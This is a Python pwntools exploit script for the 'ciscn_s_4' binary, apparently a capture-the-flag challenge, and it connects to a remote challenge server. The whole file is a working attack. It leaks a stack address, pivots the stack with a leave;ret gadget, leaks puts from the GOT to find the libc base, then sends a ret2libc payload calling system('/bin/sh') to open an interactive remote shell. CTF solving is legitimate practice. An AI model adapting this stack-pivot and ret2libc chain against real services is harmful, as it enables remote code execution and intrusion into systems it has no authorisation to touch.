from pwn import *

context.log_level = "debug"

exe = ELF("./ciscn_s_4")
# libc = exe.libc
# r = exe.process()
# gdb.attach(r)

libc = ELF("./libc-2.27.so")
r = remote("node4.buuoj.cn", 26173)

# 0x080484b8 : leave ; ret
leave_ret = p32(0x80484B8)


r.recvuntil(b"name?\n")
r.send(cyclic(0x24))
r.recv(0x2F)
buf_addr = u32(r.recv(4)) - 0x38
success("buf_addr: " + hex(buf_addr))
r.send(
    p32(0)
    + p32(exe.plt["puts"])
    + p32(exe.sym["main"])
    + p32(exe.got["puts"])
    + cyclic(0x18)
    + p32(buf_addr)
    + leave_ret
)
r.recvlinesS(2)
libc_puts = u32(r.recv(4))
libc_base = libc_puts - libc.sym["puts"]
libc_system = libc_base + libc.sym["system"]
libc_bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
success("libc base: " + hex(libc_base))

r.recvuntil(b"name?\n")
r.send(cyclic(0x24))
r.recv(0x2F)
buf_addr = u32(r.recv(4)) - 0x38
success("buf_addr: " + hex(buf_addr))
r.send(
    p32(0)
    + p32(libc_system)
    + p32(exe.sym["main"])
    + p32(libc_bin_sh)
    + cyclic(0x18)
    + p32(buf_addr)
    + leave_ret
)
r.interactive()
